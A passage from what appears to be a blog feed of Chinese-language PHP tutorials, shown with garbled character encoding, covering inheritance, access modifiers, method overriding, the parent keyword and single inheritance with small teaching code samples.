ä¸ä¼šæœ‰è¯­æ³•é”™è¯¯ï¼Œä¹Ÿå¯ä»¥ç»§æ‰¿ï¼Œä½†æ˜¯ä¸ç¬¦åˆå®é™…</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€ç»§æ‰¿æ˜¯åˆ©ç”¨extendsè¿›è¡Œå­ç±»å’Œçˆ¶ç±»çš„å…³è”</p><p>2ã€ç»§æ‰¿åˆ©ç”¨extendså…³é”®å­—å®ç°</p><p>3ã€ç»§æ‰¿æ˜¯æŒ‡å®ç°ç»§æ‰¿å…³ç³»åï¼Œå­ç±»å¯¹è±¡å¯ä»¥è®¿é—®çˆ¶ç±»è¢«ç»§æ‰¿çš„æˆå‘˜ã€‚è€Œçˆ¶ç±»å¯¹è±¡ï¼ˆç›´æ¥å®ä¾‹åŒ–çˆ¶ç±»å¾—åˆ°ï¼‰ä¸å¯ä»¥è®¿é—®å­ç±»æˆå‘˜ï¼ˆæ²¡æœ‰å…³ç³»ï¼‰</p><h3 id="2ã€æœ‰é™ç»§æ‰¿"><a href="#2ã€æœ‰é™ç»§æ‰¿" class="headerlink" title="2ã€æœ‰é™ç»§æ‰¿"></a><strong>2ã€æœ‰é™ç»§æ‰¿</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£phpä¸­ç»§æ‰¿çš„å†…å®¹ï¼ŒæŒæ¡ç»§æ‰¿æ¶æ„ä¸­çš„è®¾è®¡æ–¹æ¡ˆå®ç°ç»§æ‰¿</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>æœ‰é™ç»§æ‰¿</strong>ï¼šæŒ‡å­ç±»åœ¨ç»§æ‰¿çˆ¶ç±»çš„æˆå‘˜çš„æ—¶å€™ï¼Œå¹¶éç»§æ‰¿æ‰€æœ‰å†…å®¹ï¼Œè€Œæ˜¯ç»§æ‰¿å¹¶ä½¿ç”¨çˆ¶ç±»éƒ¨åˆ†å†…å®¹</p><ul><li>phpä¸­ç»§æ‰¿çš„æœ¬è´¨æ˜¯å¯¹è±¡ç»§æ‰¿</li><li>phpä¸­ç»§æ‰¿çš„å†…å®¹ï¼šçˆ¶ç±»æ‰€æœ‰å…¬æœ‰æˆå‘˜ã€å—ä¿æŠ¤æˆå‘˜å’Œç§æœ‰å±æ€§ï¼Œç§æœ‰æ–¹æ³•ä¸èƒ½ç»§æ‰¿</li><li>å—ä¿æŠ¤ï¼ˆprotectedï¼‰æˆå‘˜æ˜¯ä¸“ç”¨äºç»§æ‰¿çš„ï¼Œå¯ä»¥åœ¨çˆ¶ç±»æˆ–è€…å­ç±»å†…éƒ¨è®¿é—®</li><li>ç§æœ‰æˆå‘˜çš„è®¿é—®åªèƒ½åœ¨æ‰€å±ç±»ä¸­è®¾å®šå…¬æœ‰æˆ–è€…å—ä¿æŠ¤æ–¹æ³•å®ç°è®¿é—®</li><li>é™æ€æˆå‘˜ä¹Ÿéµå¾ªç»§æ‰¿è§„åˆ™ï¼šå³å­ç±»å¯ä»¥è®¿é—®çˆ¶ç±»é™æ€æˆå‘˜ï¼ˆæ»¡è¶³ç»§æ‰¿æ¡ä»¶ä¸‹ï¼‰</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€ç»§æ‰¿å†…å®¹ï¼šphpä¸­ç»§æ‰¿æ˜¯å­ç±»ç»§æ‰¿çˆ¶ç±»æ‰€æœ‰çš„å…¬æœ‰æˆå‘˜ã€å—ä¿æŠ¤æˆå‘˜å’Œç§æœ‰å±æ€§ï¼Œä¸èƒ½ç»§æ‰¿çˆ¶ç±»çš„ç§æœ‰æ–¹æ³•</p><pre><code># çˆ¶ç±»class Human{    const CALL = &apos;äºº&apos;;    public $name = &apos;human&apos;;    protected $age = &apos;100&apos;;    private $money = &apos;100&apos;;    public function showName(){        echo $this-&gt;name;    }    protected function showAge(){        echo $this-&gt;age;    }    private function showMoney(){        echo $this-&gt;money;    }}# å­ç±»class Man extends Human{}# å®ä¾‹åŒ–å­ç±»$m = new Man();var_dump($m);                # å¯ä»¥çœ‹åˆ°çˆ¶ç±»ç§æœ‰å±æ€§ï¼šè¯´æ˜è¢«ç»§æ‰¿$m-&gt;showName();                # å…è®¸ç›´æ¥è®¿é—®ï¼šæ–¹æ³•ä¸ºå…¬æœ‰å…è®¸ç±»å¤–è®¿é—®</code></pre><p>2ã€å—ä¿æŠ¤ç»§æ‰¿protectedï¼Œprotectedå…³é”®å­—çš„äº§ç”Ÿæœ¬èº«å°±æ˜¯çº¯ç”¨äºç»§æ‰¿çš„ï¼Œè¡¨ç¤ºå…è®¸è¢«å­ç±»åœ¨å­ç±»å†…éƒ¨è®¿é—®çš„æ„æ€ï¼Œè€Œä¸å…è®¸è¢«å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚</p><pre><code># çˆ¶ç±»class Human{    protected $age = &apos;100&apos;;    protected function showAge(){        echo $this-&gt;age;    }}# å­ç±»class Man extends Human{    # åœ¨å­ç±»å†…éƒ¨å¢åŠ å…¬æœ‰è®¿é—®è®¿é—®ç»§æ‰¿è‡ªçˆ¶ç±»çš„å—ä¿æŠ¤æˆå‘˜    public function getProtected(){        echo $this-&gt;age;                # è®¿é—®çˆ¶ç±»å—ä¿æŠ¤å±æ€§        $this-&gt;showAge();                # è®¿é—®çˆ¶ç±»å—ä¿æŠ¤æ–¹æ³•    }}# å®ä¾‹åŒ–å­ç±»å¯¹è±¡$m = new Man();$m-&gt;getProtected();                        # æ­£ç¡®è¾“å‡ºï¼šè¯´æ˜å¯ä»¥è®¿é—®</code></pre><p>3ã€è®¿é—®çˆ¶ç±»ç§æœ‰æˆå‘˜ï¼šå­ç±»è‹¥æƒ³è®¿é—®çˆ¶ç±»ç§æœ‰æˆå‘˜ï¼Œé‚£ä¹ˆå‰ææ˜¯çˆ¶ç±»æä¾›äº†èƒ½å¤Ÿè®¿é—®ç§æœ‰æˆå‘˜çš„æ¥å£ï¼šå³æä¾›äº†å…¬æœ‰æˆ–è€…å—ä¿æŠ¤çš„æ–¹æ³•ç»™å­ç±»è®¿é—®</p><pre><code># çˆ¶ç±»class Human{    private $age = 100;    private $money = 100;    # æä¾›æ¥å£ä¾›å­ç±»è®¿é—®ï¼šæ­¤æ—¶é€šå¸¸æ˜¯å—ä¿æŠ¤çš„æ–¹æ³•ï¼Œè‚¯å®šä¸å…è®¸å¤–éƒ¨ç›´æ¥è®¿é—®çš„    protected function getAge(){        echo $this-&gt;age;    }}# å­ç±»class Man extends Human{    # ä¾ç„¶éœ€è¦å®šä¹‰æ–¹æ³•æ¥è®¿é—®ç»§æ‰¿è‡ªçˆ¶ç±»çš„å—ä¿æŠ¤çš„æˆå‘˜    public function showPrivate(){        $this-&gt;getAge();    }}# å®ä¾‹åŒ–å­ç±»å¯¹è±¡$m = new Man();$m-&gt;showPrivate();        # è¾“å‡º100ï¼Œè¡¨ç¤ºæ­£ç¡®è®¿é—®</code></pre><p><strong>æ³¨æ„</strong>ï¼šè™½ç„¶å­ç±»å¯ä»¥é€šè¿‡ä»¥ä¸Šæ–¹å¼æ¥å®ç°è®¿é—®çˆ¶ç±»çš„ç§æœ‰æˆå‘˜ï¼ˆåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯ä»è®¾è®¡çš„æ„ä¹‰ä¸Šè®²ï¼Œç§æœ‰å°±æ˜¯ä¸å…è®¸å¤–éƒ¨è®¿é—®ï¼Œæ‰€ä»¥çˆ¶ç±»é€šå¸¸ä¸ä¼šæä¾›å¯¹å¤–çš„è®¿é—®æ¥å£ï¼Œä»¥ä¸Šæ¡ˆä¾‹åªæ˜¯ä¸ºäº†çŸ¥è¯†è¯´æ˜ã€‚</p><p>4ã€é™æ€æˆå‘˜ï¼ˆç±»å¸¸é‡ï¼‰ä¹Ÿéµå¾ªç»§æ‰¿è§„åˆ™ï¼ˆphpç»§æ‰¿æœ¬è´¨æ˜¯å¯¹è±¡ï¼‰ï¼Œåªæ˜¯è®¿é—®æ–¹å¼æ˜¯ç”±ç±»è¿›è¡Œè®¿é—®</p><pre><code>class Human{    const NAME = &apos;äºº&apos;;    public static $count = 0;    protected static $type = array(&apos;é»‘&apos;,&apos;é»„&apos;,&apos;ç™½&apos;);    public static function getCount(){        echo self::NAME;        echo self::$count;    }    protected static function getType(){        print_r(self::$type);    }}class Man extends Human{    # ä¾ç„¶éœ€è¦å­ç±»ä¸­è®¿é—®å—ä¿æŠ¤æˆå‘˜    public static function getHuman(){        Human::getType();    }}echo Man::$count;    # å…è®¸ç›´æ¥è®¿é—®Man::getCount();    # è®¿é—®çˆ¶ç±»é™æ€æ–¹æ³•Man::getHuman();    # åˆ©ç”¨å­ç±»å…¬æœ‰æ–¹æ³•è®¿é—®çˆ¶ç±»å—ä¿æŠ¤æˆå‘˜</code></pre><p>5ã€æ„é€ æ–¹æ³•å’Œææ„æ–¹æ³•ä¹Ÿå¯ä»¥è¢«å­ç±»ç»§æ‰¿ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„å­ç±»å¯¹è±¡å®ä¾‹åŒ–æ—¶å¯¹åº”çš„çˆ¶ç±»æ„é€ æ–¹æ³•çš„å‚æ•°</p><pre><code># çˆ¶ç±»class Human{    private $money;    public function __construct($money){        $this-&gt;money = $money;    }    public function __destruct(){        echo &apos;die&apos;;    }}# å­ç±»ç»§æ‰¿class Man extends Human{}# å­ç±»å®ä¾‹åŒ–ï¼šè‡ªèº«æ˜¯ç©ºç±»ï¼Œæ²¡æœ‰æŒ‡å®šæ„é€ æ–¹æ³•# $m = new Man();                    # é”™è¯¯ï¼šç¼ºå°‘å‚æ•°ï¼Œå› ä¸ºä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•$m = new Man(100);                    # æ­£ç¡®</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€ç»§æ‰¿æ˜¯æœ‰é™ç»§æ‰¿ï¼Œç†è®ºä¸Šæ˜¯ç”¨æ¥ç»§æ‰¿çˆ¶ç±»å…è®¸è¢«ç»§æ‰¿çš„éƒ¨åˆ†ï¼Œå³ä½¿ç”¨publicæˆ–è€…protectedä¿®é¥°çš„æˆå‘˜ï¼ˆæœ‰é™ç»§æ‰¿æŒ‡çš„æ˜¯æœ‰é™èƒ½ç”¨è€Œå·²ï¼‰</p><p>2ã€å› ä¸ºå¯¹è±¡çš„å±æ€§æ˜¯ä¿å­˜åœ¨å¯¹è±¡å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥çˆ¶ç±»çš„ç§æœ‰å±æ€§ä¹Ÿä¼šç»§æ‰¿</p><p>3ã€çˆ¶ç±»ç§æœ‰æˆå‘˜æœ¬è´¨ä¸å…è®¸è¢«å­ç±»è®¿é—®ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡çˆ¶ç±»å¼€æ”¾æ¥å£å®ç°ï¼ˆä¸€èˆ¬ä¸ä¼šè¿™ä¹ˆæ“ä½œï¼‰</p><p>4ã€é™æ€æˆå‘˜ä¹Ÿå¯ä»¥éµå¾ªç»§æ‰¿è§„åˆ™</p><p>5ã€æ„é€ æ–¹æ³•ä¹Ÿå¯ä»¥è¢«ç»§æ‰¿ï¼Œå› æ­¤åœ¨å®ä¾‹åŒ–å­ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œè¦è€ƒè™‘åˆ°çˆ¶ç±»æ„é€ æ–¹æ³•æ‰€ä½¿ç”¨åˆ°çš„å‚æ•°é—®é¢˜</p><h3 id="3ã€é‡å†™Override"><a href="#3ã€é‡å†™Override" class="headerlink" title="3ã€é‡å†™Override"></a><strong>3ã€é‡å†™Override</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£é‡å†™çš„æ¦‚å¿µï¼ŒæŒæ¡é‡å†™çš„æ„ä¹‰</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>é‡å†™</strong>ï¼šoverrideï¼Œå­ç±»ä¸­å®šä¹‰äº†ä¸çˆ¶ç±»é‡åçš„æˆå‘˜</p><ul><li>å­ç±»å¯ä»¥é‡å†™çˆ¶ç±»ä»»æ„ç±»æˆå‘˜<ul><li>å±æ€§ï¼šç›´æ¥è¦†ç›–ï¼Œçˆ¶ç±»å¯¹è±¡çš„å±æ€§å°†ä¸å­˜åœ¨ï¼ˆç§æœ‰é™¤å¤–ï¼‰</li><li>æ–¹æ³•ï¼šåŒæ—¶å­˜åœ¨</li></ul></li><li>é€šå¸¸é‡å†™æ˜¯ç”¨æ¥é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œç”¨äºæ‰©å±•æˆ–è€…æ›´æ”¹æŸäº›ä¸šåŠ¡é€»è¾‘</li><li>é‡å†™è¦æ±‚<ul><li>å­ç±»å¯¹äºæˆå‘˜çš„æ§åˆ¶æƒä¸èƒ½é«˜äºçˆ¶ç±»</li><li>å­ç±»é‡å†™æ–¹æ³•æ—¶ï¼Œå‚æ•°è¦æ±‚ä¸çˆ¶ç±»ä¸€è‡´</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å­˜åœ¨ç»§æ‰¿å…³ç³»</p><p>2ã€çˆ¶ç±»å­˜åœ¨æ–¹æ³•ï¼Œä½†æ˜¯ä¸æ»¡è¶³å­ç±»ä¸šåŠ¡è¦æ±‚</p><p>3ã€å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•ï¼ˆæˆ–è€…å±æ€§ï¼‰</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å­ç±»ç»§æ‰¿çˆ¶ç±»ï¼ŒåŒæ—¶å­ç±»å®šä¹‰ä¸çˆ¶ç±»åŒåçš„ç±»æˆå‘˜</p><pre><code># çˆ¶ç±»class Human{    public $name = &apos;Human&apos;;    public function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# å­ç±»ç»§æ‰¿class Man extends Human{    # å®šä¹‰åŒåå±æ€§    public $name = &apos;Man&apos;;    # å®šä¹‰çˆ¶ç±»åŒåæ–¹æ³•    public function show(){        echo __CLASS__,&apos; hello world&lt;br/&gt;&apos;;    }}</code></pre><p>2ã€é‡å†™çˆ¶ç±»æˆå‘˜ä¹‹åï¼Œå­ç±»åªä¼šç›´æ¥è®¿é—®å­ç±»çš„æˆå‘˜ï¼ˆè¦†ç›–ï¼‰</p><pre><code># æ¥ä¸Šè¿°ä»£ç # å®ä¾‹åŒ–å­ç±»å¯¹è±¡$m = new Man();$m-&gt;show();                # è¾“å‡ºHuman hello worldvar_dump($m);            # åªæœ‰å­ç±»å±æ€§$name</code></pre><p><strong>æ³¨æ„</strong>ï¼šä¸ç®¡æ˜¯å…¬æœ‰å’Œæ˜¯å—ä¿æŠ¤å±æ€§ï¼Œä¸€æ—¦é‡å†™ï¼Œçˆ¶ç±»çš„å°±ä¼šä¸å­˜åœ¨ï¼Œè€Œç§æœ‰å±æ€§ä¸ä¼šè¢«è¦†ç›–è€Œä¸¢å¤±</p><p>3ã€é‡å†™çš„è¦æ±‚1ï¼šå­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œæ§åˆ¶æƒä¸èƒ½é«˜äºçˆ¶ç±»ï¼Œå³å­ç±»å¯ä»¥æ¯”çˆ¶ç±»æ›´å¼€æ”¾</p><pre><code># çˆ¶ç±»class Human{    protected function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# å­ç±»ç»§æ‰¿class Man extends Human{    # é‡å†™    protected function show(){}                # æ­£ç¡®    public function show(){}                # å…è®¸    private function show(){}                # é”™è¯¯ï¼šæ§åˆ¶æƒæ¯”çˆ¶ç±»æ›´ä¸¥æ ¼  }</code></pre><p>4ã€é‡å†™çš„è¦æ±‚2ï¼šphpä¸­é‡å†™è¦æ±‚å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•çš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯ä¸çˆ¶ç±»åŒåæ–¹æ³•å‚æ•°ä¸€è‡´</p><pre><code># çˆ¶ç±»class Human{    protected function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# å­ç±»ç»§æ‰¿class Man extends Human{    # é‡å†™    public function show(){}    public function show($a){}            # é”™è¯¯ï¼Œä¸çˆ¶ç±»åŒåæ–¹æ³•ä¸ä¸€è‡´}</code></pre><p><strong>æ³¨æ„</strong>ï¼šåœ¨æ–¹æ³•å‚æ•°ä¸€è‡´ä¸å•å•è¦æ±‚æ•°é‡ä¸€è‡´ï¼Œè€Œä¸”æ•°æ®ç±»å‹è¦æ±‚ä¹Ÿå¿…é¡»ç›¸åŒï¼Œä½†å½¢å‚åå­—å¯ä»¥ä¸åŒï¼›å¦å¤–ï¼Œåœ¨php7ä»¥å‰é‡å†™å¯¹äºå‚æ•°è¿™å—æ²¡æœ‰è¦æ±‚ã€‚</p><p>5ã€é‡å†™çš„è¦æ±‚3ï¼šé‡å†™é’ˆå¯¹çš„æ˜¯è¢«ç»§æ‰¿çš„æˆå‘˜ï¼Œçˆ¶ç±»ç§æœ‰æ–¹æ³•ä¸ä¼šè¢«ç»§æ‰¿ï¼Œå› æ­¤ä¸å—è¦æ±‚2è§„å®š</p><pre><code># çˆ¶ç±»class Human{    private function show(){        echo __CLASS__,&apos;&lt;br/&gt;&apos;;    }}# å­ç±»class Man extends Human{    private function show($name){        # ä¸ä¼šæŠ¥é”™ï¼Œå› ä¸ºæœ¬è´¨ä¸å­˜åœ¨é‡å†™ï¼ˆçˆ¶ç±»Human::showæ²¡æœ‰è¢«ç»§æ‰¿ï¼‰        echo $name,&apos;&lt;br/&gt;&apos;;    }}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€é‡å†™overrideæ˜¯ä¸€ç§åœ¨å­ç±»ä¸­å®šä¹‰çˆ¶ç±»åŒåæˆå‘˜çš„æ“ä½œ</p><p>2ã€å…¬æœ‰ã€å—ä¿æŠ¤çš„å±æ€§é‡å†™æ˜¯ç›´æ¥è¦†ç›–çˆ¶ç±»æˆå‘˜ï¼Œç§æœ‰å±æ€§ä¸ä¼šè¢«è¦†ç›–ï¼›å…¬æœ‰ã€æ”¶ä¿æŠ¤çš„æ–¹æ³•ä¼šè¢«é‡å†™ï¼Œä½†æ˜¯ç§æœ‰æ–¹æ³•ä¸ä¼šè¢«é‡å†™ï¼ˆç§æœ‰æ–¹æ³•æœ¬è´¨æ²¡æœ‰è¢«ç»§æ‰¿ï¼‰</p><p>3ã€é‡å†™çš„è¦æ±‚</p><ul><li>å­ç±»æ§åˆ¶æƒä¸èƒ½é«˜äºçˆ¶ç±»æ§åˆ¶æƒ</li><li>php7ä¸­è¦æ±‚è¢«é‡å†™çš„æ–¹æ³•å¿…é¡»ä¸çˆ¶ç±»ä¿æŒå‚æ•°ä¸€è‡´ï¼ˆæ•°é‡å’Œç±»å‹ï¼‰</li><li>ç§æœ‰æ–¹æ³•ä¸èƒ½ç»§æ‰¿ï¼Œå› æ­¤ä¸å­˜åœ¨é‡å†™</li></ul><p>4ã€é™æ€æˆå‘˜ä¹Ÿå¯ä»¥è¢«é‡å†™ï¼Œä½†æ˜¯é™æ€å±æ€§ä¸ä¼šè¢«è¦†ç›–ï¼ˆå±äºç±»ï¼Œä¸å±äºå¯¹è±¡ï¼‰</p><h3 id="4ã€parentå…³é”®å­—"><a href="#4ã€parentå…³é”®å­—" class="headerlink" title="4ã€parentå…³é”®å­—"></a>4ã€parentå…³é”®å­—</h3><blockquote><p>ç›®æ ‡ï¼šç†è§£é‡å†™åçš„è®¿é—®åŸç†ï¼Œä½¿ç”¨parentå®ç°è¢«é‡å†™åçš„çˆ¶ç±»æˆå‘˜è®¿é—®</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>parentå…³é”®å­—</strong>ï¼šä¸€ç§æ˜ç¡®è®¿é—®çˆ¶ç±»æˆå‘˜çš„è¡¨è¾¾æ–¹å¼</p><ul><li>parentå…³é”®å­—æ˜¯ç”¨äºåœ¨è¢«é‡å†™çš„æ–¹æ³•ï¼ˆå­ç±»ï¼‰ä¸­æ˜ç¡®è®¿é—®çˆ¶ç±»è¢«é‡å†™æˆå‘˜</li><li>parentå¯ä»¥è®¿é—®çˆ¶ç±»é™æ€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»å¸¸é‡å’Œæ™®é€šæ–¹æ³•</li><li><p>parentä½¿ç”¨èŒƒå›´è§£ææ“ä½œç¬¦è®¿é—®</p><p>parent::çˆ¶ç±»æ–¹æ³•()</p></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å­ç±»ç»§æ‰¿çˆ¶ç±»</p><p>2ã€å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•</p><p>3ã€å­ç±»é‡å†™çš„æ–¹æ³•å†…éƒ¨éœ€è¦è®¿é—®çˆ¶ç±»æˆå‘˜æˆ–è€…æ˜ç¡®éœ€è¦è®¿é—®çˆ¶ç±»æˆå‘˜</p><p>4ã€ä½¿ç”¨parentè®¿é—®çˆ¶ç±»æ–¹æ³•</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€çˆ¶ç±»ä¸ºæ•°æ®åº“åˆå§‹åŒ–ç±»ï¼Œå­ç±»ä¸ºé’ˆå¯¹è¡¨çš„ä¸šåŠ¡ç±»ï¼šå­ç±»ç»§æ‰¿çˆ¶ç±»ï¼Œä½†æ˜¯å­ç±»ä¹Ÿæœ‰èµ„æºè¦åˆå§‹åŒ–ï¼Œéœ€è¦é‡å†™çˆ¶ç±»æ„é€ æ–¹æ³•ï¼šä½†æ˜¯åˆéœ€è¦çˆ¶ç±»çš„æ„é€ æ–¹æ³•æ‰§è¡Œä»¥å®ç°æ•°æ®åº“çš„åˆå§‹åŒ–æ“ä½œ</p><pre><code>class DB{    protected $link;    public function __construct(){        $this-&gt;link = mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;db_2&apos;,&apos;3306&apos;) or die(&apos;æ•°æ®åº“è¿æ¥å¤±è´¥ï¼&apos;);        echo __METHOD__;    }}class Table extends DB{    # é‡å†™çˆ¶ç±»æ–¹æ³•    public function __construct(){        # è®©çˆ¶ç±»æ„é€ æ–¹æ³•å…ˆæ‰§è¡Œ        parent::__construct();        # æ‰§è¡Œå…¶ä»–        echo __METHOD__;    }}# å®ä¾‹åŒ–$t = new Table();        # è¾“å‡ºDB::__construct Table::__construct</code></pre><p>2ã€é™æ€å±æ€§é‡å†™åï¼Œéœ€è¦åœ¨å­ç±»ä¸­è¿›è¡Œè®¿é—®</p><pre><code>class Father{    public static $count = 1;}class Son extends Father{    # é‡å†™    public static $count = 2;    public static function getCount(){        echo self::$count + parent::$count;    }}# è°ƒç”¨Son::getCount();</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€æ–¹æ³•è¢«é‡å†™åï¼Œè®¿é—®è°ƒç”¨çš„éƒ½æ˜¯å­ç±»æ–¹æ³•ï¼Œå¦‚æœæƒ³è¦è®¿é—®çˆ¶ç±»æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡åœ¨å­ç±»æ–¹æ³•ä¸­ä½¿ç”¨parentå…³é”®å­—æ¥å¼ºåˆ¶è®¿é—®çˆ¶ç±»æ–¹æ³•</p><p>2ã€parentä¸èƒ½ç”¨äºè®¿é—®çˆ¶ç±»çš„å±æ€§ï¼ˆé™æ€å±æ€§å¯ä»¥ï¼‰</p><h3 id="5ã€phpç»§æ‰¿ç‰¹ç‚¹"><a href="#5ã€phpç»§æ‰¿ç‰¹ç‚¹" class="headerlink" title="5ã€phpç»§æ‰¿ç‰¹ç‚¹"></a><strong>5ã€phpç»§æ‰¿ç‰¹ç‚¹</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£phpç»§æ‰¿çš„ç‰¹æ€§ï¼Œé¿å…åœ¨ä½¿ç”¨ç»§æ‰¿è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>phpç»§æ‰¿ç‰¹ç‚¹</strong>ï¼šä¸å…¶ä»–çº¯é¢å‘å¯¹è±¡ï¼ˆä»è®¾è®¡ä¹‹åˆå°±å®Œå…¨ç”±é¢å‘å¯¹è±¡æ€ç»´æ”¯é…ï¼‰ç¼–ç¨‹è¯­è¨€æ˜¯æœ‰ä¸€äº›ä¸ä¸€æ ·</p><ul><li>phpåªèƒ½å•ç»§æ‰¿ï¼Œåªæœ‰ä¸€ä¸ªçˆ¶ç±»</li><li>phpç»§æ‰¿ä¸­ï¼Œåªæœ‰ç§æœ‰æ–¹æ³•ä¸èƒ½ç»§æ‰¿</li><li>phpå…è®¸ç»§æ‰¿çˆ¶ç±»ä¸­çš„æ„é€ æ–¹æ³•å’Œææ„æ–¹æ³•</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€phpä¸­ç»§æ‰¿åªèƒ½å•ç»§æ‰¿ï¼šå³å­ç±»åªæœ‰ä¸€ä¸ªçˆ¶ç±»ï¼ˆæœ‰äº›è¯­è¨€æ”¯æŒå¤šç»§æ‰¿ï¼‰</p><pre><code>class Man{}class Woman{}class Ladyboy extends Man,Woman{}    # phpä¸­é”™è¯¯ï¼Œä¸å…è®¸ç»§æ‰¿å¤šä¸ªçˆ¶ç±»</code></pre><p>2ã€phpè‹¥æƒ³ç»§æ‰¿å¤šä¸ªç±»ï¼Œå¯ä»¥ä½¿ç”¨é“¾å¼ç»§æ‰¿</p><pre><code>class Man{}class Woman extends Man{}class Ladyboy extends Woman{}        # LadyboyåŒ…å«äº†Manå’ŒWomanç±»ä¸­æ‰€æœ‰å¯ç»§æ‰¿çš„æˆå‘˜</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€phpä¸­çš„ç»§æ‰¿ä¸ä¼ ç»Ÿçš„é¢å‘å¯¹è±¡ç»§æ‰¿æœ‰ç€ä¸€äº›å°åŒºåˆ«ï¼Œå¤§å®¶åœ¨ä½¿ç”¨ç»§æ‰¿çš„æ—¶å€™è¦ä¸¥æ ¼éµå®ˆphpçš„ç»§æ‰¿è§„åˆ™</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpé¢å‘å¯¹è±¡åŸºç¡€</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/1PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/1PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"><a href="#è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ" class="headerlink" title="è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"></a>è½¬è½½è‡ªï¼š<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">é»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ</a></h4><h1 id="é¢å‘å¯¹è±¡åŸºç¡€"><a href="#é¢å‘å¯¹è±¡åŸºç¡€" class="headerlink" title="é¢å‘å¯¹è±¡åŸºç¡€"></a>é¢å‘å¯¹è±¡åŸºç¡€</h1><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šç†è§£é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³ï¼Œäº†è§£è®¡ç®—æœºç¼–ç¨‹è¯­è¨€çš„æ¼”å˜è¿‡ç¨‹ï¼ŒæŒæ¡PHPé¢å‘å¯¹è±¡çš„åŸºç¡€è¯­æ³•ï¼Œä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³å’Œé¢å‘å¯¹è±¡è¯­æ³•å®ç°ç¼–ç¨‹è§£å†³éœ€æ±‚é—®é¢˜</p></blockquote><ul><li>è®¡ç®—æœºè¯­è¨€å‘å±•å²</li><li>é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ€æƒ³</li><li>é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³</li><li>é¢å‘å¯¹è±¡åŸºç¡€è¯­æ³•</li><li>ç»¼åˆè¿ç”¨</li></ul><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>ç¼–ç¨‹è¯­æ³•å‘å±•å²</strong>ï¼šè®¡ç®—æœºç¼–ç¨‹åœ¨å†å²çš„å‘å±•é•¿æ²³ä¸­ï¼Œç»å†äº†å¤šæ¬¡<code>ç‰ˆæœ¬å˜é©</code>ï¼Œå˜åŒ–çš„è½¨è¿¹æ˜¯ä¼´éšç€ç¡¬ä»¶çš„å‘å±•å’Œäººä»¬å¯¹äºè®¡ç®—æœºçš„è®¤çŸ¥ä»¥åŠéœ€æ±‚ã€‚</p><ul><li><p>æœºå™¨è¯­è¨€ï¼šå³å¼€å‘è€…ï¼ˆç§‘å­¦å®¶ï¼‰ä½¿ç”¨<code>0</code>å’Œ<code>1</code>ç»„æˆå‘½ä»¤ï¼Œç„¶ååœ¨ç‰¹å®šè®¡ç®—æœºä¸Šæ‰§è¡Œ</p><ul><li><p>ä¼˜ç‚¹ï¼šæ‰§è¡Œæ•ˆç‡é«˜</p></li><li><p>ç¼ºç‚¹ï¼šå¼€å‘éš¾åº¦å¤§ã€ç§»æ¤æ€§å·®ã€å¼€å‘æˆæœ¬é«˜</p></li></ul></li><li><p>æ±‡ç¼–è¯­è¨